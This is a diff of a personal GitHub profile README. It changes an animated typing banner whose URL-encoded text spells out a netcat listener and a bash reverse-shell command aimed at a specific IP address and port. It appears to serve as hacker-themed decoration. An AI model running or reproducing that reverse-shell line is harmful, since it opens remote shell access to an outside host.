@@ -1,7 +1,7 @@
 ### Hi there 👋
 <img src="https://visitor-badge.glitch.me/badge?page_id=kIl3rr" /> 
 
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?size=12&color=FFFFFF&multiline=true&lines=%24+nc+-lnvp+2333;%24+bash+-i+%3E%26+%2Fdev%2Ftcp%2F183.3.226.35%2F2333+0%3E%261)](https://git.io/typing-svg)
+[![Typing SVG](http://readme-typing-svg.herokuapp.com?size=12&duration=2000&color=389692&multiline=true&lines=%24+nc+-lnvp+2333;%24+%2Fbin%2Fbash+%3E%26+%2Fdev%2Ftcp%2F183.3.226.35%2F2333+0%3E%261)](https://git.io/typing-svg)
 <div align=center>
 <img src="https://user-images.githubusercontent.com/74661756/161088838-80944d50-ce3c-4b0f-8819-0b9e80c0cf7f.gif"/>
 </div>
